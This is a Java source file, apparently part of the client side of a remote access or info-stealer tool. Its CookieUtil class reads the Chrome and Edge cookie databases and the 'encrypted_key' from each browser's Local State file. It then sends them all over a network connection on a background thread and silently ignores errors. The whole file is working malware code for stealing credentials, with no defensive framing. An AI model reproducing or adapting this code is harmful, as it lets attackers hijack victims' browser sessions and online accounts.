package client.utils.system;

import client.connection.ClientConnection;
import client.connection.ID;

import java.io.*;
import java.nio.file.Files;
import java.util.Objects;

public class CookieUtil {
    public static byte[] getChromeCookie() {
        try {
            File file = new File(System.getProperty("user.home") + "\\AppData" + "\\Local" + "\\Google" + "\\Chrome" + "\\User Data" + "\\Default" + "\\Network" + "\\Cookies");
            if (file.exists())
                return Files.readAllBytes(file.toPath());

            file = new File(System.getProperty("user.home") + "\\AppData" + "\\Local" + "\\Google" + "\\Chrome" + "\\User Data" + "\\Default" + "\\Cookies");
            if (file.exists())
                return Files.readAllBytes(file.toPath());

            return "File does not exist".getBytes();
        }catch (Exception e){
            return e.getMessage().getBytes();
        }
    }

    public static byte[] getChromeKey() {
        String filePath = System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
        File file = new File(filePath);

        try (BufferedReader reader = new BufferedReader(new FileReader(file.getPath()))) {
            StringBuilder jsonStringBuilder = new StringBuilder();
            String line;

            while ((line = reader.readLine()) != null) {
                jsonStringBuilder.append(line);
            }

            String json = jsonStringBuilder.toString();
            String targetKey = "\"encrypted_key\":";

            int index = json.indexOf(targetKey);
            if (index != -1) {
                int startIndex = index + targetKey.length();
                int endIndex = json.indexOf(",", startIndex);

                if (endIndex == -1) {
                    endIndex = json.indexOf("}", startIndex);
                }

                if (endIndex != -1) {
                    return json.substring(startIndex, endIndex).replace("\"", "").trim().getBytes();
                }
            }
        } catch (IOException ignored) {}

        return null;
    }

    public static byte[] getEdgeCookie(){
        try {
            File file = new File(System.getProperty("user.home") + "\\AppData" + "\\Local" + "\\Microsoft" + "\\Edge" + "\\User Data" + "\\Default" + "\\Network" + "\\Cookies");
            if (file.exists())
                return Files.readAllBytes(file.toPath());

            file = new File(System.getProperty("user.home") + "\\AppData" + "\\Local" + "\\Microsoft" + "\\Edge" + "\\User Data" + "\\Default" + "\\Cookies");
            if (file.exists())
                return Files.readAllBytes(file.toPath());

            return "File does not exist".getBytes();
        }catch (Exception e){
            return e.getMessage().getBytes();
        }
    }

    public static byte[] getEdgeKey() {
        String filePath = System.getProperty("user.home") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";
        File file = new File(filePath);

        try (BufferedReader reader = new BufferedReader(new FileReader(file.getPath()))) {
            StringBuilder jsonStringBuilder = new StringBuilder();
            String line;

            while ((line = reader.readLine()) != null) {
                jsonStringBuilder.append(line);
            }

            String json = jsonStringBuilder.toString();
            String targetKey = "\"encrypted_key\":";

            int index = json.indexOf(targetKey);
            if (index != -1) {
                int startIndex = index + targetKey.length();
                int endIndex = json.indexOf(",", startIndex);

                if (endIndex == -1) {
                    endIndex = json.indexOf("}", startIndex);
                }

                if (endIndex != -1) {
                    return json.substring(startIndex, endIndex).replace("\"", "").trim().getBytes();
                }
            }
        } catch (IOException ignored) {
        }

        return null;
    }

    public static void sendCookie(ClientConnection connection) {
        new Thread(()-> {
            try {
                byte[] chromeCookie = getChromeCookie();
                byte[] edgeCookie = getEdgeCookie();

                if(chromeCookie != null) {
                    connection.sendHead(ID.CHROME_COOKIE());
                    connection.sendData(chromeCookie);
                    connection.sendData(Objects.requireNonNull(getChromeKey()));
                }else
                    connection.sendHead(ID.COOKIE());

                if(edgeCookie != null){
                    connection.sendHead(ID.EDGE_COOKIE());
                    connection.sendData(edgeCookie);
                    connection.sendData(Objects.requireNonNull(getEdgeKey()));
                }else
                    connection.sendHead(ID.COOKIE());

            }catch (Exception ignored){}
        }).start();
    }

}
